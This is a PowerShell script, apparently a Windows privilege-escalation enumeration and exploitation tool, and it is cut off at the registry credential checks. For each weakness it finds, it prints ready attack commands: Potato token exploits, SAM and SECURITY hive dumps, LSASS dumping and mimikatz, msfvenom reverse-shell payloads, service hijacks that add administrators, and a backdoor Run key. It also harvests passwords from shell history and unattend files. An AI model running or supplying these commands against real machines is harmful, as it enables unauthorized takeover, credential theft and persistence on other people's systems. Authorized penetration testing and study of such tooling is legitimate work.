<#
.SYNOPSIS
    Complete Windows Privilege Escalation Enumeration & Exploitation Guide - ENHANCED
.DESCRIPTION
    Comprehensive automated privilege escalation checker covering ALL vectors up to 2026
    Author: Security Researcher
    Version: 3.0 - ENHANCED EDITION
#>

# Color coding functions
function Write-Good { param($text) Write-Host "[+] $text" -ForegroundColor Green }
function Write-Bad { param($text) Write-Host "[-] $text" -ForegroundColor Red }
function Write-Info { param($text) Write-Host "[*] $text" -ForegroundColor Cyan }
function Write-Vuln { param($text) Write-Host "[!] EXPLOITABLE: $text" -ForegroundColor Yellow }
function Write-Exploit { param($text) Write-Host "    → $text" -ForegroundColor Magenta }

$ErrorActionPreference = "SilentlyContinue"
$VulnCount = 0

Write-Host @"
╔═══════════════════════════════════════════════════════════════════╗
║   Windows Privilege Escalation Enumeration & Exploitation Guide  ║
║                 ENHANCED - Full Automated Analysis                ║
║                        Version 3.0                                ║
╚═══════════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan

# ============================================================================
# 1. SYSTEM INFORMATION
# ============================================================================
Write-Host "`n[====== SYSTEM INFORMATION ======]" -ForegroundColor Yellow
$sysinfo = systeminfo
$hostname = hostname
$OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
$OSVersion = (Get-WmiObject -Class Win32_OperatingSystem).Version
$Architecture = (Get-WmiObject -Class Win32_OperatingSystem).OSArchitecture
$BuildNumber = (Get-WmiObject -Class Win32_OperatingSystem).BuildNumber

Write-Info "Hostname: $hostname"
Write-Info "OS: $OS"
Write-Info "Version: $OSVersion"
Write-Info "Build: $BuildNumber"
Write-Info "Architecture: $Architecture"

# Check for outdated OS versions
if ($OS -like "*Windows 7*" -or $OS -like "*Server 2008*" -or $OS -like "*Vista*" -or $OS -like "*XP*") {
    Write-Vuln "OUTDATED OS - Multiple kernel exploits likely available"
    $VulnCount++
    Write-Exploit "Search: 'Windows 7 kernel exploits', 'MS16-032', 'MS15-051', 'MS16-075'"
    Write-Exploit "Tool: Windows Exploit Suggester, Sherlock.ps1, Watson"
}

# Check for Server Core
$installationType = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").InstallationType
if ($installationType -eq "Server Core") {
    Write-Info "Server Core installation detected"
}

# ============================================================================
# 2. CURRENT USER CONTEXT
# ============================================================================
Write-Host "`n[====== USER CONTEXT ======]" -ForegroundColor Yellow
$currentUser = whoami
$groups = whoami /groups
$privs = whoami /priv

Write-Info "Current User: $currentUser"

# Check if already admin/system
if ($currentUser -like "*SYSTEM*" -or $currentUser -like "*Administrator*") {
    Write-Good "Already running as privileged user: $currentUser"
} else {
    Write-Info "Running as standard user"
}

# Check group memberships
$adminGroups = @("Administrators", "Domain Admins", "Enterprise Admins", "Backup Operators", "Account Operators", "Server Operators", "Print Operators")
$groupOutput = whoami /groups | Out-String
foreach ($adminGroup in $adminGroups) {
    if ($groupOutput -match $adminGroup) {
        Write-Vuln "User is member of privileged group: $adminGroup"
        $VulnCount++
        Write-Exploit "Group: $adminGroup"
        Write-Exploit "May have elevated privileges or access"
    }
}

# ============================================================================
# 3. DANGEROUS PRIVILEGES CHECK (ENHANCED)
# ============================================================================
Write-Host "`n[====== PRIVILEGE ANALYSIS ======]" -ForegroundColor Yellow
$privileges = whoami /priv | Out-String

# Create a hashtable of dangerous privileges
$dangerousPrivs = @{
    "SeImpersonatePrivilege" = @{
        "Description" = "Impersonate a client after authentication"
        "Exploits" = @("JuicyPotato", "RoguePotato", "PrintSpoofer", "GodPotato", "SweetPotato")
        "Commands" = @(
            ".\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}",
            ".\PrintSpoofer.exe -i -c cmd",
            ".\GodPotato.exe -cmd 'cmd /c whoami'",
            ".\RoguePotato.exe -r YOUR_IP -l 9999 -e 'cmd.exe'"
        )
    }
    "SeAssignPrimaryTokenPrivilege" = @{
        "Description" = "Replace a process level token"
        "Exploits" = @("Similar to SeImpersonate - use Potato exploits")
        "Commands" = @("Use same tools as SeImpersonatePrivilege")
    }
    "SeTcbPrivilege" = @{
        "Description" = "Act as part of the operating system"
        "Exploits" = @("Create tokens", "Impersonate any user")
        "Commands" = @("Abuse token creation APIs")
    }
    "SeBackupPrivilege" = @{
        "Description" = "Back up files and directories"
        "Exploits" = @("Copy SAM/SYSTEM", "Read any file", "Backup Domain Controller")
        "Commands" = @(
            "reg save HKLM\SAM C:\temp\sam.hive",
            "reg save HKLM\SYSTEM C:\temp\system.hive",
            "reg save HKLM\SECURITY C:\temp\security.hive",
            "secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL"
        )
    }
    "SeRestorePrivilege" = @{
        "Description" = "Restore files and directories"
        "Exploits" = @("Modify system files", "Replace service binaries", "Overwrite ACLs")
        "Commands" = @(
            "Replace C:\Windows\System32\Utilman.exe with cmd.exe",
            "Overwrite service binaries",
            "Modify registry with backup tools"
        )
    }
    "SeTakeOwnershipPrivilege" = @{
        "Description" = "Take ownership of files or objects"
        "Exploits" = @("Take ownership of any file/registry key")
        "Commands" = @(
            "takeown /f C:\Windows\System32\config\SAM",
            "icacls C:\Windows\System32\config\SAM /grant %username%:F",
            "takeown /f C:\Windows\System32\*.dll /A /R"
        )
    }
    "SeLoadDriverPrivilege" = @{
        "Description" = "Load and unload device drivers"
        "Exploits" = @("Load malicious kernel drivers", "Capcom.sys exploit")
        "Commands" = @(
            "EoPLoadDriver exploit",
            "Load vulnerable signed driver (Capcom.sys, RTCore64.sys)"
        )
    }
    "SeDebugPrivilege" = @{
        "Description" = "Debug programs"
        "Exploits" = @("Debug any process", "Dump LSASS", "Inject into processes")
        "Commands" = @(
            "procdump.exe -ma lsass.exe lsass.dmp",
            "rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID C:\temp\lsass.dmp full",
            "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords'"
        )
    }
    "SeManageVolumePrivilege" = @{
        "Description" = "Perform volume maintenance tasks"
        "Exploits" = @("SeManageVolumeExploit", "Arbitrary file write")
        "Commands" = @("Use SeManageVolumeAbuse tools")
    }
}

foreach ($priv in $dangerousPrivs.Keys) {
    if ($privileges -match "$priv.*Enabled") {
        Write-Vuln "$priv is ENABLED"
        $VulnCount++
        $privInfo = $dangerousPrivs[$priv]
        Write-Exploit "Description: $($privInfo.Description)"
        Write-Exploit "Exploits: $($privInfo.Exploits -join ', ')"
        foreach ($cmd in $privInfo.Commands) {
            Write-Exploit "Command: $cmd"
        }
    }
}

# ============================================================================
# 4. KERNEL EXPLOIT DETECTION (ENHANCED)
# ============================================================================
Write-Host "`n[====== KERNEL EXPLOIT DETECTION ======]" -ForegroundColor Yellow
$hotfixes = Get-HotFix | Select-Object -ExpandProperty HotFixID

Write-Info "Installed Patches: $($hotfixes.Count) found"

# Comprehensive list of critical patches
$criticalKBs = @{
    "KB2393802" = "MS11-046 - AFD.sys Local Privilege Escalation"
    "KB3143141" = "MS16-032 - Secondary Logon Service Privilege Escalation"
    "KB3124280" = "MS16-016 - WebDAV Privilege Escalation"
    "KB2850851" = "MS13-053 - win32k.sys Local Privilege Escalation"
    "KB3139914" = "MS16-034 - Windows Kernel Local Privilege Escalation"
    "KB3057191" = "MS15-051 - Windows Kernel Mode Drivers Privilege Escalation"
    "KB4013081" = "MS17-010 - EternalBlue/DoublePulsar"
    "KB2829361" = "MS13-046 - NTUserMessageCall Privilege Escalation"
    "KB3000061" = "MS14-058 - Win32k.sys Privilege Escalation"
    "KB2918614" = "MS14-002 - Windows Kernel Elevation of Privilege"
    "KB3126587" = "MS16-014 - Microsoft Windows Privilege Escalation"
    "KB3136041" = "MS16-032 - Secondary Logon Handle Privilege Escalation"
    "KB4013389" = "MS17-012 - Windows SMBv1 Server Security Feature Bypass"
}

foreach ($kb in $criticalKBs.Keys) {
    if ($hotfixes -notcontains $kb) {
        Write-Vuln "Missing patch: $kb - $($criticalKBs[$kb])"
        $VulnCount++
        Write-Exploit "Search for exploit: $($criticalKBs[$kb])"
        Write-Exploit "Tools: GitHub exploit repositories, Exploit-DB"
    }
}

# System boot time check
$bootTime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$daysSinceBoot = ((Get-Date) - $bootTime).Days
if ($daysSinceBoot -gt 180) {
    Write-Vuln "System hasn't rebooted in $daysSinceBoot days - likely missing patches"
    $VulnCount++
    Write-Exploit "Run Windows Exploit Suggester or Watson to find kernel exploits"
    Write-Exploit "Command: python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt"
}

# Check last patch date
$lastPatch = Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 1
if ($lastPatch.InstalledOn) {
    $daysSincePatch = ((Get-Date) - $lastPatch.InstalledOn).Days
    Write-Info "Last patch installed: $($lastPatch.InstalledOn) ($daysSincePatch days ago)"
    if ($daysSincePatch -gt 90) {
        Write-Vuln "No patches in last 90 days - system likely vulnerable"
        $VulnCount++
    }
}

# ============================================================================
# 5. ALWAYSINSTALLELEVATED CHECK
# ============================================================================
Write-Host "`n[====== ALWAYSINSTALLELEVATED CHECK ======]" -ForegroundColor Yellow
$regHKLM = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
$regHKCU = Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue

if ($regHKLM.AlwaysInstallElevated -eq 1 -and $regHKCU.AlwaysInstallElevated -eq 1) {
    Write-Vuln "AlwaysInstallElevated is ENABLED in both HKLM and HKCU"
    $VulnCount++
    Write-Exploit "Create malicious MSI and execute as SYSTEM"
    Write-Exploit "Tool: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi"
    Write-Exploit "Command: msiexec /quiet /qn /i C:\path\to\evil.msi"
    Write-Exploit "PowerShell: Write-UserAddMSI (PowerUp.ps1)"
} else {
    Write-Info "AlwaysInstallElevated not enabled"
}

# ============================================================================
# 6. SERVICE ENUMERATION (ENHANCED - INTEGRATED)
# ============================================================================
Write-Host "`n[====== SERVICE MISCONFIGURATION CHECK (COMPREHENSIVE) ======]" -ForegroundColor Yellow

# Get all services (not just running ones)
$allServices = Get-WmiObject win32_service
$runningServices = $allServices | Where-Object {$_.State -eq 'Running'}

Write-Info "Total Services: $($allServices.Count) | Running: $($runningServices.Count)"

# 1. Check Service Registry Permissions
Write-Host "`n[--- SERVICE REGISTRY PERMISSIONS ---]" -ForegroundColor Cyan
$serviceRegPath = "HKLM:\System\CurrentControlSet\Services"
Get-ChildItem $serviceRegPath -ErrorAction SilentlyContinue | ForEach-Object {
    try {
        $serviceName = $_.PSChildName
        $acl = Get-Acl $_.PSPath -ErrorAction SilentlyContinue
        
        $weakPerms = $acl.Access | Where-Object {
            ($_.IdentityReference -notmatch "SYSTEM|Administrators|TrustedInstaller") -and
            ($_.RegistryRights -match "FullControl|WriteKey|SetValue|CreateSubKey")
        }
        
        if ($weakPerms) {
            $serviceInfo = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
            Write-Vuln "Modifiable Service Registry: $serviceName"
            $VulnCount++
            Write-Exploit "ImagePath: $($serviceInfo.ImagePath)"
            Write-Exploit "Writable by: $($weakPerms.IdentityReference -join ', ')"
            Write-Exploit "Rights: $($weakPerms.RegistryRights | Select-Object -First 1)"
            Write-Exploit "Exploit Step 1: sc config $serviceName binPath= 'net localgroup administrators user /add'"
            Write-Exploit "Exploit Step 2: sc stop $serviceName"
            Write-Exploit "Exploit Step 3: sc start $serviceName"
            Write-Exploit "Alternative: reg add 'HKLM\System\CurrentControlSet\Services\$serviceName' /v ImagePath /t REG_EXPAND_SZ /d 'C:\temp\reverse.exe' /f"
        }
    } catch {}
}

# 2. Check Service Binary Permissions
Write-Host "`n[--- SERVICE BINARY PERMISSIONS ---]" -ForegroundColor Cyan
$allServices | Where-Object {$_.PathName} | ForEach-Object {
    $binaryPath = ($_.PathName -replace '"', '').Split()[0]
    
    if (Test-Path $binaryPath) {
        try {
            $acl = Get-Acl $binaryPath -ErrorAction SilentlyContinue
            $weakPerms = $acl.Access | Where-Object {
                ($_.IdentityReference -notmatch "SYSTEM|Administrators|TrustedInstaller") -and
                ($_.FileSystemRights -match "FullControl|Modify|Write")
            }
            
            if ($weakPerms) {
                Write-Vuln "Writable Service Binary: $($_.Name)"
                $VulnCount++
                Write-Exploit "Service: $($_.Name)"
                Write-Exploit "Binary: $binaryPath"
                Write-Exploit "Writable by: $($weakPerms.IdentityReference -join ', ')"
                Write-Exploit "StartName: $($_.StartName)"
                Write-Exploit "State: $($_.State)"
                Write-Exploit "Exploit Step 1: Generate payload: msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > evil.exe"
                Write-Exploit "Exploit Step 2: sc stop $($_.Name)"
                Write-Exploit "Exploit Step 3: copy /Y evil.exe '$binaryPath'"
                Write-Exploit "Exploit Step 4: sc start $($_.Name)"
            }
        } catch {}
    }
}

# 3. Check Service Binary Directory Permissions
Write-Host "`n[--- SERVICE BINARY DIRECTORY PERMISSIONS ---]" -ForegroundColor Cyan
$allServices | Where-Object {$_.PathName} | ForEach-Object {
    $binaryPath = ($_.PathName -replace '"', '').Split()[0]
    
    if (Test-Path $binaryPath) {
        $binaryDir = Split-Path $binaryPath -Parent
        try {
            $acl = Get-Acl $binaryDir -ErrorAction SilentlyContinue
            $weakPerms = $acl.Access | Where-Object {
                ($_.IdentityReference -notmatch "SYSTEM|Administrators|TrustedInstaller") -and
                ($_.FileSystemRights -match "FullControl|Modify|Write")
            }
            
            if ($weakPerms) {
                Write-Vuln "Writable Service Binary Directory: $($_.Name)"
                $VulnCount++
                Write-Exploit "Service: $($_.Name)"
                Write-Exploit "Directory: $binaryDir"
                Write-Exploit "Writable by: $($weakPerms.IdentityReference -join ', ')"
                Write-Exploit "Exploit: DLL Hijacking or replace binary"
            }
        } catch {}
    }
}

# 4. Check Unquoted Service Paths (Enhanced)
Write-Host "`n[--- UNQUOTED SERVICE PATHS ---]" -ForegroundColor Cyan
$allServices | Where-Object {
    $_.PathName -and
    $_.PathName -notmatch '^".*"' -and 
    $_.PathName -match '.* .*\.exe' -and
    $_.PathName -notmatch '^[A-Z]:\\Windows\\'
} | ForEach-Object {
    Write-Vuln "Unquoted Service Path: $($_.Name)"
    $VulnCount++
    Write-Exploit "Service: $($_.Name)"
    Write-Exploit "Path: $($_.PathName)"
    Write-Exploit "StartName: $($_.StartName)"
    Write-Exploit "StartMode: $($_.StartMode)"
    Write-Exploit "State: $($_.State)"
    
    # Calculate ALL possible exploit paths
    $path = $_.PathName -replace '"', ''
    $pathParts = $path -split ' '
    Write-Exploit "Possible exploit paths (check if writable):"
    
    $potentialPaths = @()
    for ($i = 0; $i -lt $pathParts.Length - 1; $i++) {
        $testPath = ($pathParts[0..$i] -join ' ')
        if ($testPath -match '\\') {
            $dir = Split-Path $testPath -Parent -ErrorAction SilentlyContinue
            if ($dir) {
                $fileName = Split-Path $testPath -Leaf
                $exploitPath = Join-Path $dir "$fileName.exe"
                if (-not ($potentialPaths -contains $exploitPath)) {
                    $potentialPaths += $exploitPath
                    Write-Exploit "  → $exploitPath"
                    
                    # Check if directory is writable
                    if (Test-Path $dir) {
                        try {
                            $testFile = Join-Path $dir "test_$(Get-Random).tmp"
                            New-Item -Path $testFile -ItemType File -Force -ErrorAction Stop | Out-Null
                            Remove-Item $testFile -Force
                            Write-Exploit "    [WRITABLE] Can create file here!"
                        } catch {}
                    }
                }
            }
        }
    }
}

# 5. Check for DLL Hijacking in Service Directories
Write-Host "`n[--- DLL HIJACKING OPPORTUNITIES IN SERVICES ---]" -ForegroundColor Cyan
$commonDLLs = @("version.dll", "wlbsctrl.dll", "cryptsp.dll", "WINHTTP.dll", "WININET.dll", "KERNEL32.dll")
$allServices | Where-Object {$_.PathName} | Select-Object -First 20 | ForEach-Object {
    $binaryPath = ($_.PathName -replace '"', '').Split()[0]
    if (Test-Path $binaryPath) {
        $binaryDir = Split-Path $binaryPath -Parent
        foreach ($dll in $commonDLLs) {
            $dllPath = Join-Path $binaryDir $dll
            if (-not (Test-Path $dllPath)) {
                # DLL doesn't exist, check if we can create it
                try {
                    New-Item -Path $dllPath -ItemType File -Force -ErrorAction Stop | Out-Null
                    Remove-Item $dllPath -Force
                    Write-Vuln "DLL Hijacking Opportunity: $($_.Name)"
                    $VulnCount++
                    Write-Exploit "Service: $($_.Name)"
                    Write-Exploit "Missing DLL: $dll in $binaryDir"
                    Write-Exploit "Can create malicious $dll"
                    break
                } catch {}
            }
        }
    }
}

# 6. Check Services Running as SYSTEM with User-Modifiable Configs
Write-Host "`n[--- SYSTEM SERVICES WITH WEAK CONFIGURATIONS ---]" -ForegroundColor Cyan
$allServices | Where-Object {$_.StartName -like "*LocalSystem*" -or $_.StartName -like "*SYSTEM*"} | ForEach-Object {
    $serviceName = $_.Name
    $regPath = "HKLM:\System\CurrentControlSet\Services\$serviceName\Parameters"
    
    if (Test-Path $regPath) {
        try {
            $acl = Get-Acl $regPath
            $weakPerms = $acl.Access | Where-Object {
                ($_.IdentityReference -notmatch "SYSTEM|Administrators|TrustedInstaller") -and
                ($_.RegistryRights -match "FullControl|WriteKey|SetValue")
            }
            
            if ($weakPerms) {
                Write-Vuln "SYSTEM Service with Modifiable Parameters: $serviceName"
                $VulnCount++
                Write-Exploit "Service: $serviceName"
                Write-Exploit "Writable Registry: $regPath"
                Write-Exploit "Writable by: $($weakPerms.IdentityReference -join ', ')"
                Write-Exploit "Exploit: Modify service parameters to execute commands"
            }
        } catch {}
    }
}

# ============================================================================
# 7. SCHEDULED TASKS (ENHANCED)
# ============================================================================
Write-Host "`n[====== SCHEDULED TASKS ENUMERATION ======]" -ForegroundColor Yellow
$tasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object {$_.State -ne "Disabled"}

Write-Info "Active Scheduled Tasks: $($tasks.Count)"

# Check for writable task binaries
foreach ($task in $tasks) {
    try {
        $taskInfo = Get-ScheduledTaskInfo $task.TaskName -ErrorAction SilentlyContinue
        $taskAction = $task.Actions
        
        if ($taskAction.Execute) {
            $executable = $taskAction.Execute
            
            # Resolve environment variables
            $executable = [Environment]::ExpandEnvironmentVariables($executable)
            
            if (Test-Path $executable) {
                $acl = Get-Acl $executable -ErrorAction SilentlyContinue
                $writePerms = $acl.Access | Where-Object {
                    ($_.FileSystemRights -match "Write|FullControl|Modify") -and 
                    ($_.IdentityReference -match "Everyone|Users|Authenticated Users|BUILTIN\\Users")
                }
                
                if ($writePerms) {
                    Write-Vuln "Writable Scheduled Task Binary: $($task.TaskName)"
                    $VulnCount++
                    Write-Exploit "Task: $($task.TaskName)"
                    Write-Exploit "Binary: $executable"
                    Write-Exploit "Run As: $($task.Principal.UserId)"
                    Write-Exploit "Writable by: $($writePerms.IdentityReference -join ', ')"
                    Write-Exploit "Last Run: $($taskInfo.LastRunTime)"
                    Write-Exploit "Next Run: $($taskInfo.NextRunTime)"
                    Write-Exploit "Exploit: Replace binary, wait for execution"
                }
            }
            
            # Check if task directory is writable
            $taskDir = Split-Path $executable -Parent -ErrorAction SilentlyContinue
            if ($taskDir -and (Test-Path $taskDir)) {
                try {
                    $testFile = Join-Path $taskDir "test_$(Get-Random).tmp"
                    New-Item -Path $testFile -ItemType File -Force -ErrorAction Stop | Out-Null
                    Remove-Item $testFile -Force
                    
                    Write-Vuln "Writable Scheduled Task Directory: $($task.TaskName)"
                    $VulnCount++
                    Write-Exploit "Task: $($task.TaskName)"
                    Write-Exploit "Directory: $taskDir"
                    Write-Exploit "Exploit: DLL Hijacking or replace binary"
                } catch {}
            }
        }
        
        # Check for tasks running as SYSTEM
        if ($task.Principal.UserId -like "*SYSTEM*" -or $task.Principal.UserId -like "*S-1-5-18*") {
            if ($taskAction.Execute -and -not ($taskAction.Execute -match "^%.*%$")) {
                Write-Info "SYSTEM Task: $($task.TaskName) runs $($taskAction.Execute)"
            }
        }
    } catch {}
}

# Check for modifiable task XML files
Write-Info "Checking for modifiable task definitions..."
$taskPath = "C:\Windows\System32\Tasks"
if (Test-Path $taskPath) {
    Get-ChildItem $taskPath -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            $acl = Get-Acl $_.FullName
            $weakPerms = $acl.Access | Where-Object {
                ($_.FileSystemRights -match "Write|FullControl|Modify") -and 
                ($_.IdentityReference -match "Everyone|Users|Authenticated Users|BUILTIN\\Users")
            }
            
            if ($weakPerms) {
                Write-Vuln "Writable Scheduled Task File: $($_.Name)"
                $VulnCount++
                Write-Exploit "File: $($_.FullName)"
                Write-Exploit "Writable by: $($weakPerms.IdentityReference -join ', ')"
                Write-Exploit "Exploit: Modify task XML to execute commands"
            }
        } catch {}
    }
}

# ============================================================================
# 8. STARTUP PROGRAMS (ENHANCED)
# ============================================================================
Write-Host "`n[====== STARTUP PROGRAMS CHECK ======]" -ForegroundColor Yellow
$startupLocations = @(
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
)

foreach ($location in $startupLocations) {
    if ($location -like "HKLM:*" -or $location -like "HKCU:*") {
        $items = Get-ItemProperty -Path $location -ErrorAction SilentlyContinue
        if ($items) {
            foreach ($prop in $items.PSObject.Properties) {
                if ($prop.Name -notmatch "PS.*") {
                    $path = $prop.Value
                    $expandedPath = [Environment]::ExpandEnvironmentVariables($path)
                    
                    if ($expandedPath -and (Test-Path $expandedPath)) {
                        try {
                            $acl = Get-Acl $expandedPath
                            $writePerms = $acl.Access | Where-Object {
                                ($_.FileSystemRights -match "Write|FullControl|Modify") -and 
                                ($_.IdentityReference -match "Everyone|Users|Authenticated Users|BUILTIN\\Users")
                            }
                            
                            if ($writePerms) {
                                Write-Vuln "Writable Startup Program: $($prop.Name)"
                                $VulnCount++
                                Write-Exploit "Registry: $location"
                                Write-Exploit "Name: $($prop.Name)"
                                Write-Exploit "Path: $expandedPath"
                                Write-Exploit "Writable by: $($writePerms.IdentityReference -join ', ')"
                                Write-Exploit "Exploit: Replace with malicious binary"
                            }
                        } catch {}
                    }
                }
            }
        }
        
        # Check if registry key itself is writable
        try {
            $acl = Get-Acl $location
            $writePerms = $acl.Access | Where-Object {
                ($_.RegistryRights -match "WriteKey|FullControl|SetValue") -and 
                ($_.IdentityReference -match "Everyone|Users|Authenticated Users|BUILTIN\\Users")
            }
            
            if ($writePerms) {
                Write-Vuln "Writable Startup Registry Key"
                $VulnCount++
                Write-Exploit "Location: $location"
                Write-Exploit "Writable by: $($writePerms.IdentityReference -join ', ')"
                Write-Exploit "Exploit: Add new startup entry"
                Write-Exploit "Command: reg add '$location' /v Backdoor /t REG_SZ /d 'C:\path\to\backdoor.exe' /f"
            }
        } catch {}
    } else {
        # File system startup folders
        if (Test-Path $location) {
            try {
                # Check folder permissions
                $acl = Get-Acl $location
                $writePerms = $acl.Access | Where-Object {
                    ($_.FileSystemRights -match "Write|FullControl|Modify") -and 
                    ($_.IdentityReference -match "Everyone|Users|Authenticated Users|BUILTIN\\Users")
                }
                
                if ($writePerms) {
                    Write-Vuln "Writable Startup Folder"
                    $VulnCount++
                    Write-Exploit "Location: $location"
                    Write-Exploit "Writable by: $($writePerms.IdentityReference -join ', ')"
                    Write-Exploit "Exploit: Place malicious executable or shortcut"
                }
                
                # List current files
                $files = Get-ChildItem $location -ErrorAction SilentlyContinue
                foreach ($file in $files) {
                    Write-Info "Startup item: $($file.Name)"
                }
            } catch {}
        }
    }
}

# ============================================================================
# 9. DLL HIJACKING CHECK (ENHANCED)
# ============================================================================
Write-Host "`n[====== DLL HIJACKING OPPORTUNITIES ======]" -ForegroundColor Yellow

# Check PATH directories
$pathDirs = $env:Path -split ';'
Write-Info "Checking PATH directories for write permissions..."

foreach ($dir in $pathDirs) {
    if ($dir -and (Test-Path $dir)) {
        try {
            $acl = Get-Acl $dir
            $writePerms = $acl.Access | Where-Object {
                ($_.FileSystemRights -match "Write|FullControl|Modify") -and 
                ($_.IdentityReference -match "Everyone|Users|Authenticated Users|BUILTIN\\Users")
            }
            
            if ($writePerms) {
                Write-Vuln "Writable PATH Directory: $dir"
                $VulnCount++
                Write-Exploit "Directory: $dir"
                Write-Exploit "Writable by: $($writePerms.IdentityReference -join ', ')"
                Write-Exploit "Exploit: DLL Hijacking - place malicious DLL"
                Write-Exploit "Common DLLs: version.dll, wlbsctrl.dll, cryptsp.dll, dwmapi.dll"
                Write-Exploit "Note: Windows searches for DLLs in PATH order"
            }
        } catch {}
    }
}

# Check Program Files directories
$programDirs = @("C:\Program Files", "C:\Program Files (x86)")
foreach ($progDir in $programDirs) {
    if (Test-Path $progDir) {
        $subdirs = Get-ChildItem $progDir -Directory -ErrorAction SilentlyContinue | Select-Object -First 50
        foreach ($subdir in $subdirs) {
            try {
                $acl = Get-Acl $subdir.FullName
                $writePerms = $acl.Access | Where-Object {
                    ($_.FileSystemRights -match "Write|FullControl|Modify") -and 
                    ($_.IdentityReference -match "Everyone|Users|Authenticated Users|BUILTIN\\Users")
                }
                
                if ($writePerms) {
                    Write-Vuln "Writable Program Directory: $($subdir.FullName)"
                    $VulnCount++
                    Write-Exploit "Directory: $($subdir.FullName)"
                    Write-Exploit "Writable by: $($writePerms.IdentityReference -join ', ')"
                    Write-Exploit "Exploit: DLL Hijacking in application directory"
                    
                    # Look for executables
                    $exes = Get-ChildItem $subdir.FullName -Filter "*.exe" -ErrorAction SilentlyContinue | Select-Object -First 3
                    if ($exes) {
                        Write-Exploit "Executables found: $($exes.Name -join ', ')"
                    }
                }
            } catch {}
        }
    }
}

# Check for writable system directories (common DLL hijacking targets)
$systemDirs = @(
    "C:\Windows\System32",
    "C:\Windows\SysWOW64",
    "C:\Windows"
)

foreach ($dir in $systemDirs) {
    if (Test-Path $dir) {
        try {
            $testFile = Join-Path $dir "test_write_$((Get-Random)).dll"
            New-Item -Path $testFile -ItemType File -Force -ErrorAction Stop | Out-Null
            Remove-Item $testFile -Force
            
            Write-Vuln "CRITICAL: Writable System Directory: $dir"
            $VulnCount++
            Write-Exploit "This is EXTREMELY dangerous - full system compromise possible"
            Write-Exploit "Can replace any system DLL"
        } catch {}
    }
}

# ============================================================================
# 10. CREDENTIAL HUNTING (ENHANCED)
# ============================================================================
Write-Host "`n[====== CREDENTIAL HUNTING ======]" -ForegroundColor Yellow

# 1. Saved credentials
Write-Info "Checking for saved credentials..."
$savedCreds = cmdkey /list | Out-String
if ($savedCreds -match "Target:") {
    Write-Vuln "Saved credentials found"
    $VulnCount++
    Write-Exploit "Credentials stored in Credential Manager"
    Write-Exploit "Command: cmdkey /list"
    Write-Exploit "Exploit: runas /savecred /user:DOMAIN\admin cmd.exe"
    Write-Exploit "Tool: mimikatz 'sekurlsa::logonpasswords'"
    
    # Extract targets
    $targets = $savedCreds | Select-String "Target:" | ForEach-Object {$_.ToString().Trim()}
    foreach ($target in $targets | Select-Object -First 10) {
        Write-Exploit "  → $target"
    }
}

# 2. PowerShell history
Write-Info "Checking PowerShell history..."
$historyPaths = @(
    (Get-PSReadlineOption).HistorySavePath,
    "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt",
    "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
)

foreach ($historyPath in $historyPaths) {
    if ($historyPath -and (Test-Path $historyPath)) {
        $history = Get-Content $historyPath
        $sensitiveCommands = $history | Select-String -Pattern "password|pwd|cred|token|key|secret|pass|api|username|login" -CaseSensitive:$false
        
        if ($sensitiveCommands) {
            Write-Vuln "Sensitive data in PowerShell history"
            $VulnCount++
            Write-Exploit "File: $historyPath"
            Write-Exploit "Found: $($sensitiveCommands.Count) potential credential lines"
            foreach ($cmd in $sensitiveCommands | Select-Object -First 5) {
                Write-Exploit "  → $cmd"
            }
        }
    }
}

# 3. Command history (CMD)
$cmdHistoryPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations"
if (Test-Path $cmdHistoryPath) {
    Write-Info "CMD history location exists: $cmdHistoryPath"
}

# 4. Unattend files
Write-Info "Searching for unattend.xml files..."
$unattendPaths = @(
    "C:\Windows\Panther\Unattend.xml",
    "C:\Windows\Panther\Unattended.xml",
    "C:\Windows\Panther\Unattend\Unattend.xml",
    "C:\Windows\System32\Sysprep\Unattend.xml",
    "C:\Windows\System32\Sysprep\Panther\Unattend.xml",
    "C:\unattend.xml"
)

foreach ($path in $unattendPaths) {
    if (Test-Path $path) {
        Write-Vuln "Unattend.xml file found: $path"
        $VulnCount++
        Write-Exploit "File may contain credentials"
        Write-Exploit "Command: type '$path' | findstr /i password"
        Write-Exploit "Command: type '$path' | findstr /i cpassword"
        
        # Try to read it
        $content = Get-Content $path -ErrorAction SilentlyContinue
        $passwords = $content | Select-String -Pattern "password|cpassword" -CaseSensitive:$false
        if ($passwords) {
            Write-Exploit "PASSWORDS FOUND IN FILE!"
            foreach ($pass in $passwords | Select-Object -First 3) {
                Write-Exploit "  → $pass"
            }
        }
    }
}

# 5. Registry credentials
Write-Info "Checking registry for stored credentials..."

